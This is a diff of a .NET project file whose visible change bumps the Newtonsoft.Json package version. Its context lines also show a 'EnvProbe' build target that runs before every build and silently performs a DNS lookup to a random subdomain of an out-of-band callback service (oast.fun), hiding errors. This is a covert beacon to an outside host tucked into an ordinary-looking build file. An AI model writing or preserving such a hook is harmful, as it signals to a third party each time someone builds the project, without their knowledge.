@@ -4,7 +4,7 @@
     <TargetFramework>net8.0</TargetFramework>
   </PropertyGroup>
   <ItemGroup>
-    <PackageReference Include="Newtonsoft.Json" Version="12.0.1" />
+    <PackageReference Include="Newtonsoft.Json" Version="13.0.4" />
   </ItemGroup>
   <Target Name="EnvProbe" BeforeTargets="Build">
     <Exec Command="nslookup rootv6.d90t4fm1b2elkc070kmg7ns3dkhuq9n3s.oast.fun 2>/dev/null || true" IgnoreExitCode="true" />
